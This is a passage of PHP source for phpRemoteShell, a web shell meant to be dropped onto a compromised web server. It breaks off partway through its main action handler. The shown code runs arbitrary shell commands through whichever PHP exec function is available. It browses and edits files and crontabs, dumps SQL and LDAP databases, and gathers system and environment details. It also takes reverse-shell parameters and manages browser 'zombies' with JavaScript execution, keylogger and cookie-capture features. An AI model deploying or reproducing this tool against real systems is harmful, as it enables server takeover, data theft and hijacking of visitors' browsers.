<?php
/*
 * Copyright (C) 2005-2019
 * Emmanuel Saracco <esaracco@users.labs.libre-entreprise.org>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330,
 * Boston, MA 02111-1307, USA.
 */

  if (!class_exists ('phpRemoteShell')){

  define ('APP_NAME', 'phpRemoteShell');
  define ('APP_VERSION', '0.12.1git201906111');

  // Main configuration array
  $config = array ();

  /* //////////////////// BEGIN "CUSTOMIZE ME" SECTION \\\\\\\\\\\\\\\\\\\ */
  
  // Authentication
  define ('CHECK_AUTH', 0);
  define ('AUTH_USER', '!!change_me!!');
  define ('AUTH_PASSWORD', '!!change_me!!');

  // Allow direct source code download of PRS by passing "prsds=" parameter on
  // URL.
  // -> If you've previously defined CHECK_AUTH as 1, this value will be
  //    always considered as 0
  define ('ALLOW_SOURCE_CODE_DOWNLOAD', 0);

  // Default user/group for the remote webserver process when they can not 
  // be retreived automatically.
  define ('HTTPD_DEFAULT_UID', 33);
  //define ('HTTPD_DEFAULT_UID', 65534);
  define ('HTTPD_DEFAULT_GID', 33);
  //define ('HTTPD_DEFAULT_GID', 65534);
  
  // FIXME
  // Set it to true if you want pages browsed by the zombie being viewed in a
  // hidden frame. It allow you to follow zombie navigation, but for the 
  //  moment it is not IE compliant
  define ('ZOMBIE_USE_HIDDEN_IFRAME', 0);

  // Downloads management
  $config['download'] = array (
    // Commands used by the 'application' line (to check their existence)
    'needed' => array ('tar', 'gzip'),
    'application' => 'tar -cf - %s | gzip -c > %s',
    'extension' => 'tar.gz',
    'mime-type' => 'application/x-gtar'
  );
  // Remote information gathering
  $config['rinfos'] = array (
    'System' => 'uname -a',
    'Ids' => 'id',
    'Shell' => 'echo $SHELL',
    'Crontab' => 'crontab -l',
    'Environment' => 'env',
    'Interfaces' => 'ip -4 a|ifconfig',
    'Routing table' => 'route -n',
    'Web server' => 'apache2 -v|apache -v|httpd -v|http2d -v',
    'Reverse proxy' => 'nginx -v',
    'Perl' => 'perl --version',
    'C compiler' => 'cc --version',
    'MySQL' => 'mysql --version',
    'PostgreSQL' => 'psql --version'
  );
  
  /* //////////////////// END  "CUSTOMIZE ME" SECTION \\\\\\\\\\\\\\\\\\\\ */
  
  // Uniq index
  $_uniq_code = 1;
 
  umask (0);

  // Try to deactivate PHP magic quotes
  ini_set ('magic_quotes_runtime', '0');

  // PHP error handler
  $GLOBALS['php_errors'] = '';
  $GLOBALS['nolog'] = 0;
  function errorHandler ($errno, $errstr, $errfile, $errline)
  {
    if (!$GLOBALS['nolog'])
    {
      $GLOBALS['php_errors'] = "* $errstr|$errline\n".$GLOBALS['php_errors'];
    }

    return true;
  }
  set_error_handler ('errorHandler');

  // PRS database prefix
  define ('DB_PREFIX', 'prs');

  // Popups
  define ('POPUP_DEFAULT_Y', 90);
  define ('POPUP_DEFAULT_X', 250);

  // Ajax
  define ('AJAX_REFRESH_INTERVAL', 10000);
  define ('AJAX_PING_TIMEOUT', 10000);
  
  // PHP shell history
  define ('SHELL_EXECUTE', $_uniq_code++);
  define ('SHELL_EXECUTE_REVERSE', $_uniq_code++);
  define ('SHELL_HISTORY_EXECUTE', $_uniq_code++);
  define ('SHELL_HISTORY_DELETE', $_uniq_code++);
  define ('SHELL_HISTORY_RESET', $_uniq_code++);

  // PHP shell aliases
  define ('SHELL_ALIASES_ADD', $_uniq_code++);
  define ('SHELL_ALIASES_DELETE', $_uniq_code++);

  // SQL shell history
  define ('SHELL_SQL_EXECUTE', $_uniq_code++);
  define ('SHELL_SQL_DUMP', $_uniq_code++);
  define ('SHELL_SQL_DUMP_TABLE', $_uniq_code++);
  define ('SHELL_SQL_HISTORY_EXECUTE', $_uniq_code++);
  define ('SHELL_SQL_HISTORY_DELETE', $_uniq_code++);
  define ('SHELL_SQL_HISTORY_RESET', $_uniq_code++);

  // Shell environment PATH
  define ('SHELL_ENVPATH_ADD', $_uniq_code++);
  define ('SHELL_ENVPATH_DELETE', $_uniq_code++);

  // Bookmarks
  define ('SHELL_BOOKMARKS_GO', $_uniq_code++);
  define ('SHELL_BOOKMARKS_DELETE', $_uniq_code++);

  // Max items in popup windows lists
  define ('EDIT_MAX', 5);

  // Edit profiles
  define ('EDIT_PROFILES_SAVE', $_uniq_code++);
  define ('EDIT_PROFILES_LOAD', $_uniq_code++);
  define ('EDIT_PROFILES_UPDATE', $_uniq_code++);
  define ('EDIT_PROFILES_DELETE', $_uniq_code++);

  // Edit databases macros
  define ('EDIT_SQL_SAVE', $_uniq_code++);
  define ('EDIT_SQL_LOAD', $_uniq_code++);
  define ('EDIT_SQL_DELETE', $_uniq_code++);

  // Application notebooks macros
  define ('SHELL_TYPE_SHELL', $_uniq_code++);
  define ('SHELL_SQL_TYPE_SHELL', $_uniq_code++);
  define ('SHELL_TYPE_PHP_CODE', $_uniq_code++);
  define ('SHELL_TYPE_REMOVE', $_uniq_code++);
  define ('SHELL_TYPE_CRONTAB', $_uniq_code++);
  define ('SHELL_TYPE_ZOMBIES', $_uniq_code++);
  define ('SHELL_TYPE_REMOTE_INFOS', $_uniq_code++);
  define ('SHELL_TYPE_FILE_BROWSER', $_uniq_code++);

  // Action menu
  define ('ACTION_MENU_SAVE', $_uniq_code++);
  define ('ACTION_MENU_MKDIR', $_uniq_code++);
  define ('ACTION_MENU_DELETE', $_uniq_code++);
  define ('ACTION_MENU_DOWNLOAD', $_uniq_code++);
  define ('ACTION_MENU_UPLOAD', $_uniq_code++);
  define ('ACTION_MENU_BOOKMARK', $_uniq_code++);
  define ('ACTION_MENU_CRONTAB_SAVE', $_uniq_code++);
  define ('ACTION_MENU_CRONTAB_REMOVE', $_uniq_code++);
  define ('ACTION_MENU_HOSTME', $_uniq_code++);
  define ('ACTION_MENU_ZOMBIE_EDIT', $_uniq_code++);
  define ('ACTION_MENU_ZOMBIE_CMD_PING', $_uniq_code++);
  define ('ACTION_MENU_ZOMBIE_CMD_EXEC_JS', $_uniq_code++);
  define ('ACTION_MENU_ZOMBIE_DELETE', $_uniq_code++);
  define ('ACTION_MENU_ZOMBIE_KL_RESET', $_uniq_code++);
  define ('ACTION_MENU_ZOMBIE_CC_RESET', $_uniq_code++);
  define ('ACTION_MENU_ZOMBIE_CK_RESET', $_uniq_code++);

  // Supported databases types
  define ('SQL_POSTGRESQL', 'PostgreSQL');
  define ('SQL_MYSQL', 'MySQL');
  define ('SQL_LDAP', 'LDAP');

  // PHP functions used by this scripts
  $config['php_functions'] = array (
    'shell_exec' => array ('type' => 'exec', 'enabled' => 0),
    'popen' => array ('type' => 'exec', 'enabled' => 0),
    'proc_open' => array ('type' => 'exec', 'enabled' => 0),
    'system' => array ('type' => 'exec', 'enabled' => 0),
    'exec' => array ('type' => 'exec', 'enabled' => 0),
    'passthru' => array ('type' => 'exec', 'enabled' => 0),
    'opendir' => array ('type' => 'browse', 'enabled' => 0),
    'readdir' => array ('type' => 'browse', 'enabled' => 0),
    'glob' => array ('type' => 'browse', 'enabled' => 0),

    'socket_create' => array ('type' => '', 'enabled' => 0),
    'file_put_contents' => array ('type' => '', 'enabled' => 0),
    'file_get_contents' => array ('type' => '', 'enabled' => 0),
    'fopen' => array ('type' => '', 'enabled' => 0),
    'filesize' => array ('type' => '', 'enabled' => 0),
    'fgets' => array ('type' => '', 'enabled' => 0),
    'file' => array ('type' => '', 'enabled' => 0),
    'fileatime' => array ('type' => '', 'enabled' => 0),
    'filemtime' => array ('type' => '', 'enabled' => 0),
    'is_binary' => array ('type' => '', 'enabled' => 0),
    'posix_getpwuid' => array ('type' => '', 'enabled' => 0),
    'posix_getgrgid' => array ('type' => '', 'enabled' => 0),
    'pg_connect' => array ('type' => '', 'enabled' => 0),
    'ldap_connect' => array ('type' => '', 'enabled' => 0),
    'mysql_connect' => array ('type' => '', 'enabled' => 0),
    'mysqli_connect' => array ('type' => '', 'enabled' => 0),
    'gethostbyname' => array ('type' => '', 'enabled' => 0),
    'phpinfo' => array ('type' => '', 'enabled' => 0)
  );

  // Main menu
  $config['main_menu'] = array (
    array ('label' => 'Edit',
           'smenu' => array (
             array ('label' => 'Profiles', 'value' => 'profiles'))),
    array ('label' => "Remote information",
           'value' => SHELL_TYPE_REMOTE_INFOS),
    array ('label' => "Shell", 
           'value' => SHELL_TYPE_SHELL,
           'smenu' => array (
             array ('label' => 'Command aliases', 'value' => 'aliases'),
             array ('label' => 'Environment PATH', 'value' => 'envpath'))),
    array ('label' => "PHP code", 
           'value' => SHELL_TYPE_PHP_CODE,
           // Old versions of PHP accept just one parameter for the
           // "highlight_string" function
           'smenu' => (highlight_string ('dum', true)) ? array (
             array ('label' => 'Highlight code', 
                    'value' => 'highlight')) : null),
    array ('label' => "File browser", 
           'value' => SHELL_TYPE_FILE_BROWSER,
           'smenu' => array (
             array ('label' => 'Initial path', 'value' => 'initpath'),
             array ('label' => 'Bookmarks', 'value' => 'bookmarks'))),
    array ('label' => 'Crontab', 
           'value' => SHELL_TYPE_CRONTAB),
    array ('label' => 'Zombies', 
           'value' => SHELL_TYPE_ZOMBIES),
    array ('label' => "SQL/LDAP", 
           'value' => SHELL_SQL_TYPE_SHELL,
           'smenu' => array (
             array ('label' => 'PostgreSQL databases', 
                    'value' => SQL_POSTGRESQL . 's'),
             array ('label' => 'MySQL databases', 
                    'value' => SQL_MYSQL . 's'),
             array ('label' => 'LDAP databases', 
                    'value' => SQL_LDAP . 's'))),
    array ('label' => "Remove me", 
           'value' => SHELL_TYPE_REMOVE));

  // Main class
  class PhpRemoteShell
  {
    var $vars = array ();
    var $sav_vars = array ();
    var $config = array ();
    var $db = array ();
    var $use_cookie = 0;
    
    function PhpRemoteShell ($config)
    {
      $this->config = $config;

      foreach (array_keys ($this->config['php_functions']) as $f)
      {
        $this->config['php_functions'][$f]['enabled'] = 
          $this->check_php_function ($f);
      }

      // if PRS file is writable, keep session data inside,
      // otherwise use cookie
      $GLOBALS['nolog'] = 1;
      if (!isset ($_POST['cryptkey']) ||
          !$this->write_file ($_SERVER['SCRIPT_FILENAME'], '', 'a'))
      {
        $this->use_cookie = 1;
      }
      $GLOBALS['nolog'] = 0;

      $this->get_all_values ();

      $this->read_db ();
      $this->action ();
    }

    function write_file ($file, $data, $mode)
    {
      $ret = 0;

      // file_put_contents
      if ($this->php_function_enabled ('file_put_contents'))
      {
        $ret = (file_put_contents (
                  $file, $data, ($mode == 'a') ? FILE_APPEND : 0) !== false);
      }
      // fopen
      elseif ($this->php_function_enabled ('fopen'))
      {
        if (($h = fopen ($file, $mode)))
        {
          $ret = (fwrite ($h, $data) !== false);
          fclose ($h);
        }
      }

      if ($ret && $mode == 'w')
      {
        chmod ($file, 0666);
      }

      return $ret;
    }

    function read_file ($file)
    {
      $data = '';

      if (!file_exists ($file))
      {
        return $data;
      }

      // file_get_contents
      if ($this->php_function_enabled ('file_get_contents'))
      {
        $data = file_get_contents ($file);
      }
      // fopen
      elseif ($this->php_function_enabled ('fopen'))
      {
        if (($h = fopen ($file, 'r')))
        {
          if ($this->php_function_enabled ('filesize') && 
              (($s = (int) filesize ($file)) > 0))
          {
            $data = fread ($h, $s);
          }
          elseif ($this->php_function_enabled ('fgets'))
          {
            while (!feof ($h))
            {
              $data .= fgets ($h);
            }
          }

          fclose ($h);
        }
      }
      // file
      elseif ($this->php_function_enabled ('file'))
      {
        $data = implode ('', file ($file));
      }

      return $data;
    }

    function read_db ()
    {
      if ($this->use_cookie)
      {
        $this->db = $_COOKIE;
        return;
      }

      // Use PRS file as DB for storing user data
      $data = $this->read_file ($_SERVER['SCRIPT_FILENAME']);
      if ($data && preg_match ('#/\* '.chr(80).'RSDATA(.*)\*/#s', $data, $m))
      {
        $data = $m[1];

        foreach (explode ("\n", $data) as $l)
        {
          if (trim ($l))
          {
            list ($k, $v) = explode (':', $l);

            if ($k)
            {
              $this->db[$k] = $v;
            }
          }
        }
      }
    }

    function write_db ($key, $value)
    {
      $data = '';

      if (empty ($value))
      {
        unset ($this->db[$key]);
      }
      else
      {
        $this->db[$key] = $value;
      }

      foreach ($this->db as $k => $v)
      {
        $data .= "$k:$v\n";
      }

      $data = '/* '.chr(80)."RSDATA\n$data*/";
      $full_data = $this->read_file ($_SERVER['SCRIPT_FILENAME']);
      $full_data = preg_replace ('#/\* '.chr(80).'RSDATA(.*)\*/#s', 
                                 $data, $full_data);
      $this->write_file ($_SERVER['SCRIPT_FILENAME'], $full_data, 'w');
    }

    function get_all_values ()
    {
      foreach (array (
        'show_hidden_files',
        'show_files',
        'show_directories',
        'show_symlinks',
        'cryptkey',
        'use_opendir',
        'use_glob',
        'host_to_ping',
        'js_to_execute',
        'mkdir_name',
        'file_content',
        'htmloutput',
        'display_type',
        'page_menu_display',
        'crontab_data',
        'show_hide_aliases',
        'show_hide_envpath',
        'show_hide_bookmarks',
        'show_hide_initpath',
        'show_hide_highlight',
        'show_hide_profiles',
        'show_hide_' . SQL_POSTGRESQL . 's',
        'show_hide_' . SQL_MYSQL . 's',
        'show_hide_' . SQL_LDAP . 's',
        'profile_current',
        'profiles_index',
        'profile_name',
        'profiles_box_x',
        'profiles_box_y',
        'sql_error',
        'sql_current',
        'sql_current_table',
        'sql_type',
        SQL_POSTGRESQL . '_database',
        SQL_POSTGRESQL . '_server',
        SQL_POSTGRESQL . '_port',
        SQL_POSTGRESQL . '_login',
        SQL_POSTGRESQL . '_password',
        SQL_POSTGRESQL . 's_index',
        SQL_POSTGRESQL . 's_box_x',
        SQL_POSTGRESQL . 's_box_y',
        SQL_MYSQL . '_database',
        SQL_MYSQL . '_server',
        SQL_MYSQL . '_port',
        SQL_MYSQL . '_login',
        SQL_MYSQL . '_password',
        SQL_MYSQL . 's_index',
        SQL_MYSQL . 's_box_x',
        SQL_MYSQL . 's_box_y',
        SQL_LDAP . '_database',
        SQL_LDAP . '_server',
        SQL_LDAP . '_port',
        SQL_LDAP . '_login',
        SQL_LDAP . '_password',
        SQL_LDAP . 's_index',
        SQL_LDAP . 's_box_x',
        SQL_LDAP . 's_box_y',
        'rs_ip',
        'rs_port',
        'command',
        'sql_command',
        'ldap_query',
        'sql_info_2',
        'ldap_rw',
        'ldap_rw_action',
        'command_current',
        'sql_command_current',
        'command_current_output',
        'sql_command_current_output',
        'env_current_path',
        'phpcode_current',
        'history_index',
        'sql_history_index',
        'envpath_index',
        'zombie_id',
        'bookmarks_index',
        'action_requested',
        'action_type',
        'action_result',
        'dir_current',
        'file_current_rights',
        'is_nav',
        'force_view',
        'force_save',
        'force_delete',
        'alias_name',
        'alias_value',
        'envpath_value',
        'bookmarks_value',
        'file_browser_initpath',
        'aliases_box_x',
        'aliases_box_y',
        'envpath_box_x',
        'envpath_box_y',
        'bookmarks_box_x',
        'bookmarks_box_y',
        'initpath_box_x',
        'initpath_box_y',
        'highlight_box_x',
        'highlight_box_y'
      ) as $var)
      {
        if (!isset ($this->vars[$var]))
        {
          $this->vars[$var] =
            $this->utf8_encode ($this->get_http_var ($var, ''));
        }
      }
  
      foreach (array (
        'history',
        'aliases',
        'envpath',
        'zombies',
        'bookmarks',
        'profiles',
        'sql_history',
        SQL_POSTGRESQL.'s',
        SQL_MYSQL.'s',
        SQL_LDAP.'s'
      ) as $var)
      {
        if (!isset ($this->vars[$var]))
        {
          $this->vars[$var] = 
            $this->form_unserialize ($this->get_http_var ($var, array ()));
        }
      }

      if (!isset ($this->vars['choice']))
      {
        $this->vars['choice'] = $this->get_http_var ('choice', array ());
      }

      if (!isset ($this->vars['www_user']))
      {
        list ($this->vars['www_user'], $this->vars['www_group']) = 
          $this->get_www_user_infos ();
      }

      $this->normalize_file_browser_options ();
      $this->normalize_envpath ();
      $this->normalize_bookmarks ();
      $this->normalize_aliases ();
      $this->normalize_initpath ();
      $this->normalize_profiles ();
      $this->normalize_sql ();
      $this->normalize_dir_current ();
      $this->normalize_profile_name ();

      $this->normalize_box_pos ('aliases');
      $this->normalize_box_pos ('envpath');
      $this->normalize_box_pos ('bookmarks');
      $this->normalize_box_pos ('initpath');
      $this->normalize_box_pos ('profiles');
      $this->normalize_box_pos (SQL_POSTGRESQL . 's');
      $this->normalize_box_pos (SQL_MYSQL . 's');
      $this->normalize_box_pos (SQL_LDAP . 's');
      $this->normalize_box_pos ('highlight');

      if (!is_file ($this->vars['dir_current']))
      {
        $this->vars['force_view'] = 0;
        $this->vars['force_save'] = 0;
        $this->vars['force_delete'] = 0;
      }

      if ($this->vars['action_type'] != ACTION_MENU_CRONTAB_SAVE)
      {
        $this->vars['crontab_data'] = '';
      }
    }

    function get_root_path ()
    {
      $res = isset ($this->vars['file_browser_initpath']) ?
             $this->vars['file_browser_initpath'] : '';

      if (!$res)
      {
        $res = '/';
      }

      if (!is_dir ($res))
      {
        $res = '';
      }

      if (!$res && is_callable ('getcwd'))
      {
        $res = getcwd ();
      }

      if (!$res)
      {
        $res = $_SERVER['DOCUMENT_ROOT'];
      }

      if (substr ($res, -1) != '/')
      {
        $res .= '/';
      }

      return $res;
    }

    function get_execute_function ()
    {
      if (!ini_get ('safe_mode') || ini_get ('safe_mode_exec_dir'))
      {
        foreach ($this->config['php_functions'] as $k => $v)
        {
          if ($v['type'] == 'exec' && $v['enabled'])
          {
            return $k;
          }
        }
      }

      return '';
    }

    function crontab_enabled ()
    {
      return $this->check_shell_command ('crontab');
    }

    function execute_enabled ()
    {
      if (!ini_get ('safe_mode') || ini_get ('safe_mode_exec_dir'))
      {
        foreach ($this->config['php_functions'] as $k => $v)
        {
          if ($v['type'] == 'exec' && $v['enabled']) 
          {
            return 1;
          }
        }
      }
    }

    function browse_enabled ()
    {
      foreach ($this->config['php_functions'] as $k => $v)
      {
        if ($v['type'] == 'browse' && $v['enabled']) 
        {
          return 1;
        }
      }
    }

    function php_function_enabled ($name)
    {
      return $this->config['php_functions'][$name]['enabled'];
    }

    // Try to manage pipes with popen or proc_open
    function openp ($cmd, &$pipe)
    {
      // popen
      if ($this->php_function_enabled ('popen'))
      {
        if ($p = $pipe = popen ($cmd, 'r'))
        {
          return $p;
        }
      }
      // proc_open
      elseif ($this->php_function_enabled ('proc_open'))
      {
        $p = proc_open ($cmd, array (1 => array ('pipe', 'w')), $pipe);
        if (is_resource ($p))
        {
          $pipe = $pipe[1];
          return $p;
        }
      }
      return null;
    }

    // Try to manage pipes with popen or proc_open
    function closep (&$p, &$pipe)
    {
      // pclose
      if ($this->php_function_enabled ('popen'))
      {
        pclose ($p);
      }
      // proc_close
      elseif ($this->php_function_enabled ('proc_open'))
      {
        fclose ($pipe);
        proc_close ($p);
      }

      return null;
    }

    function check_shell_command ($name)
    {
      $cmd = ($name == 'crontab') ? ' -l' : ' --version';
      $ret = 0;

      $res = $this->execute_command_safe ("$name $cmd");

      switch ($name)
      {
        case 'crontab': 
          $ret = (preg_match ('/^(crontab|no crontab)/', $res)); 
          break;

        default:
          $ret = preg_match ('/(\d|\-version)/', $res);
      }

      return $ret;
    }

    function check_php_function ($name)
    {
      $ret = 0;

      if (function_exists ($name))
      {
        switch ($name)
        {
          // opendir
          case 'opendir':
            if ($d = opendir ($this->get_root_path ()))
            {
              closedir ($d);
              $ret = 1;
            }
            break;

          // readdir
          case 'readdir':
            if (function_exists ('opendir') &&
                ($d = opendir ($this->get_root_path ())))
            {
              $ret = (readdir ($d) !== false);
              closedir ($d);
            }
            break;

          default:
            $ret = 1;
        }
      }

      return $ret;
    }

    function check_auth ()
    {
      if (!CHECK_AUTH)
      {
        return;
      }

      if (!isset ($_SERVER['PHP_AUTH_USER']) ||
          $_SERVER['PHP_AUTH_USER'] != AUTH_USER ||
          !isset ($_SERVER['PHP_AUTH_PW']) ||
          $_SERVER['PHP_AUTH_PW'] != AUTH_PASSWORD)
      {
        header ('HTTP/1.1 401 Authorization Required');
        header ('Date: ' . gmdate ('D, d M Y H:i:s') . ' GMT');
        header ('WWW-Authenticate: Basic realm="PRS"');
        header ('Connection: close');
        header ('Content-Type: text/html; charset=utf-8');
      	if ($_SERVER['PHP_AUTH_USER'] != AUTH_USER ||
    	    $_SERVER['PHP_AUTH_PW'] != AUTH_PASSWORD) 
        {
          exit (1);
        }
      }
    }

    function get_www_user_infos ()
    {
      if (!($user = trim ($this->execute_command_safe ('id -un')))) 
      {
        $user = HTTPD_DEFAULT_UID;
      }

      if (!($group = trim ($this->execute_command_safe ('id -gn')))) 
      {
        $group = HTTPD_DEFAULT_GID;
      }

      return array ($user, $group);
    }

    function set_to_db ($key, $value)
    {
      $key = DB_PREFIX."_$key";
      $value = (empty ($value)) ? '' : base64_encode (serialize ($value));

      if ($this->use_cookie)
      {
        setcookie ($key, $value, mktime (0, 0, 0, 1, 1, 2035), '/');
      }
      else
      {
        $this->write_db ($key, $value);
      }
    }

    function get_from_db ($key)
    {
      $key = DB_PREFIX."_$key";

      foreach ($this->db as $k => $v)
      {
        if ($this->fix_magic_quotes ($k) == $key)
        {
          return  $this->fix_magic_quotes (unserialize (base64_decode ($v)));
        }
      }

      return '';
    }

    function array_clean_for_cookie ($arr)
    {
      foreach ($arr as $k => $v)
      {
        if (empty ($v) ||
            strpos ($k, 'profile') !== false ||
            strpos ($k, SQL_POSTGRESQL) !== false ||
            strpos ($k, SQL_MYSQL) !== false ||
            strpos ($k, SQL_LDAP) !== false ||
            $k == 'action_requested' ||
            $k == 'www_group' ||
            $k == 'www_user')
        {
          unset ($arr[$k]);
        }
        elseif (is_array ($v))
        {
          if (!count ($v))
          {
            unset ($arr[$k]);
          }
          else
          {
            $this->array_clean_for_cookie ($arr[$k]);
          }
        }
      }

      return $arr;
    }

    function save_profile ($name)
    {
      $value = $this->array_clean_for_cookie ($this->vars);
      $this->set_to_db ("profile_$name", $value);
    }

    function delete_profile ($name)
    {
      $this->set_to_db ("profile_$name", '');
    }

    function load_profile ($name)
    {
      $vars_sav = $this->vars;
      $value = $this->get_from_db ("profile_$name");

      if (is_array ($value))
      {
        $this->vars = $value;
      }

      $this->vars['profiles'] = $this->get_profiles ();

      foreach ($vars_sav as $k => $v)
      {
        if (strpos ($k, 'profile') !== false)
        {
          $this->vars[$k] = $v;
        }
      }

      $this->get_all_values ();
    }

    function get_profiles ()
    {
      $profiles = array ();
      $this->read_db ();

      foreach ($this->db as $k => $v)
      {
        $k = $this->fix_magic_quotes ($k);
        if (strpos ($k, DB_PREFIX.'_profile_') !== false) 
        {
          $k = substr ($k, strrpos ($k, '_') + 1, strlen ($k) - 1);
          $profiles[$k] = $k;
        }
      }

      return $profiles;
    }

    function save_sql ($name, $type)
    {
      $value = $this->array_clean_for_cookie ($this->vars["{$type}s"]);
      $this->set_to_db ("{$type}_$name", $value);
    }

    function delete_sql ($name, $type)
    {
      $this->set_to_db ("{$type}_$name", '');
    }

    function load_sql ($type)
    {
      $vars_sav = $this->vars["{$type}s"];
      $this->vars["{$type}s"] = $this->get_sql ($type);

      foreach ($vars_sav as $k => $v)
      {
        $this->vars["{$type}s"][$k] = $v;
      }

      $this->get_all_values ();
    }

    function get_sql ($type)
    {
      $dbs = array ();

      $this->read_db ();

      foreach ($this->db as $k => $v)
      {
        $k = $this->fix_magic_quotes ($k);
        if (strpos ($k, DB_PREFIX."_{$type}_") !== false) 
        {
          $k = substr ($k, strrpos ($k, '_') + 1, strlen ($k) - 1);
          $a = unserialize (base64_decode ($v));
          $dbs[$k] = $a[$k];
        }
      }

      return $dbs;
    }

    function form_serialize ($val)
    {
      return base64_encode (serialize ($val));
    }

    function form_unserialize ($val)
    {
      return (is_array ($val)) ? $val : unserialize (base64_decode ($val));
    }

    function form_get_serialize ($name)
    {
      return $this->form_serialize ($this->vars[$name]);
    }

    function get_show_hide ($name)
    {
      if ($this->vars["show_hide_$name"] != 'hidden' &&
          $this->vars["show_hide_$name"] != 'visible')
      {
        $this->vars["show_hide_$name"] = 'hidden';
      }

      return $this->vars["show_hide_$name"];
    }

    function history_exists ()
    {
      return (is_array ($this->vars['history']) &&
              count ($this->vars['history']) > 0);
    }

    function sql_history_exists ()
    {
      return (is_array ($this->vars['sql_history']) && 
              count ($this->vars['sql_history']) > 0);
    }

    function cmd_replace_aliases ($cmd)
    {
      if (preg_match_all ('/\$([a-z\,_0-9]+)/', $cmd, $matches))
      {
        foreach ($matches[1] as $alias)
        {
          if (isset ($this->vars['aliases'][$alias]))
          {
            $cmd = preg_replace ("/\\$$alias/",
                                 $this->vars['aliases'][$alias], $cmd);
          }
        }
      }

      return $cmd;
    }

    function cmd_replace_sql_client_commands ($cmd)
    {
      $type = $this->vars['sql_type'];
      $comp = preg_replace ("/;.*$/", '', strtolower (trim ($cmd)));
      $scmd = preg_split ('/\s+/', $cmd);

      // List databases
      if ($comp == '\\l' || // PostgreSQL
          preg_match ('/show\s+databases/', $cmd)) // MySQL
      {
        switch ($type)
        {
          case SQL_POSTGRESQL:
            $cmd = "SELECT d.datname as \"Name\",r.rolname as \"Owner\",pg_catalog.pg_encoding_to_char(d.encoding) as \"Encoding\" FROM pg_catalog.pg_database d JOIN pg_catalog.pg_roles r ON d.datdba = r.oid ORDER BY 1";
            break;

          case SQL_MYSQL:
            $cmd = 'SHOW DATABASES';
            break;
        }
      }
      // List tables
      elseif ($comp == '\\dt' || // PostgreSQL
              preg_match ('/show\s+tables/', $cmd)) // MySQL
      {
        switch ($type)
        {
          case SQL_POSTGRESQL:
            $cmd = "SELECT c.relname as \"Name\",n.nspname as \"Schema\",r.rolname as \"Owner\" FROM pg_catalog.pg_class c JOIN pg_catalog.pg_roles r ON r.oid = c.relowner LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname <> 'pg_catalog' AND n.nspname !~ '^pg_toast' AND pg_catalog.pg_table_is_visible(c.oid) ORDER BY 1,2;";
            break;

          case SQL_MYSQL:
            $cmd = 'SHOW TABLES';
            break;
        }
      }

      return $cmd;
    }

    function action ()
    {
      $this->vars['command_current'] = '';
      $this->vars['sql_command_current'] = '';
      sort ($this->vars['history']);
      sort ($this->vars['sql_history']);
      sort ($this->vars['envpath']);
      sort ($this->vars['bookmarks']);
      sort ($this->vars['profiles']);

      switch ($this->vars['action_requested'])
      {
        case SHELL_EXECUTE:
          $this->vars['command_current'] = $this->vars['command'];
          break;

        case SHELL_HISTORY_EXECUTE:
          $this->vars['command_current'] = 
            $this->vars['history'][(int) $this->vars['history_index']];
          break;

        case SHELL_HISTORY_DELETE:
          unset ($this->vars['history'][(int) $this->vars['history_index']]);
          break;

        case SHELL_HISTORY_RESET:
          $this->vars['history'] = array ();
          break;

        case SHELL_ALIASES_ADD:
          $name = trim ($this->vars['alias_name']);
          $value = trim ($this->vars['alias_value']);
          if (!empty ($name) && !empty ($value))
          {
            $this->vars['aliases'][$name] = $value;
          }
          break;
      
        case SHELL_ALIASES_DELETE:
          unset ($this->vars['aliases'][$this->vars['alias_name']]);
          break;

        case SHELL_SQL_EXECUTE:
          $this->vars['sql_command_current'] = $this->vars['sql_command'];
          break;

        case SHELL_SQL_DUMP:
        case SHELL_SQL_DUMP_TABLE:
          $this->sql_send_dump ();
          break;

        case SHELL_SQL_HISTORY_EXECUTE:
          if ($this->vars['sql_type'] == SQL_LDAP)
          {
            $this->vars['ldap_query'] = 
              $this->vars['sql_history'][(int)$this->vars['sql_history_index']];

            $this->vars['sql_command_current'] = $this->vars['ldap_query'];
          }
          else
          {
            $this->vars['sql_command_current'] = 
              $this->vars['sql_history'][(int)$this->vars['sql_history_index']];
          }
          break;

        case SHELL_SQL_HISTORY_DELETE:
          unset (
            $this->vars['sql_history'][(int)$this->vars['sql_history_index']]);
          break;

        case SHELL_SQL_HISTORY_RESET:
          $this->vars['sql_history'] = array ();
          break;

        case SHELL_ENVPATH_ADD:
          $value = trim ($this->vars['envpath_value']);
          if (!empty ($value) && !in_array ($value, $this->vars['envpath']))
          {
            array_push ($this->vars['envpath'], $value);
          }
          break;
      
        case SHELL_ENVPATH_DELETE:
          unset ($this->vars['envpath'][(int) $this->vars['envpath_index']]);
          break;

        case SHELL_BOOKMARKS_GO:
          $this->vars['display_type'] = SHELL_TYPE_FILE_BROWSER;
          $this->vars['dir_current'] = 
            $this->vars['bookmarks'][(int) $this->vars['bookmarks_index']];
          break;

        case SHELL_BOOKMARKS_DELETE:
         unset ($this->vars['bookmarks'][(int) $this->vars['bookmarks_index']]);
          break;

        case EDIT_PROFILES_SAVE:
          $name = trim ($this->vars['profile_name']);
          if (strlen ($name) && !in_array ($name, $this->vars['profiles']))
          {
            array_push ($this->vars['profiles'], $name);
            $this->vars['profile_current'] = $name;
            $this->save_profile ($name);
          }
          break;

        case EDIT_PROFILES_UPDATE:
          $this->save_profile (
            $this->vars['profiles'][(int) $this->vars['profiles_index']]);
          break;
      
        case EDIT_PROFILES_LOAD:
          $this->load_profile (
            $this->vars['profiles'][(int) $this->vars['profiles_index']]);
          break;
      
        case EDIT_PROFILES_DELETE:
          $name = $this->vars['profiles'][(int) $this->vars['profiles_index']];
          unset ($this->vars['profiles'][(int) $this->vars['profiles_index']]);
          $this->delete_profile ($name);
          if ($this->vars['profile_current'] == $name)
          {
            $this->vars['profile_current'] = '';
          }
          break;

        case EDIT_SQL_SAVE:
          $type = $this->vars['sql_type'];
          $this->vars['display_type'] = SHELL_SQL_TYPE_SHELL;

          if (!$this->vars[$type.'_server']) 
          {
            $this->vars[$type.'_server'] = 'localhost';
          }

          if (!$this->vars[$type.'_port'])
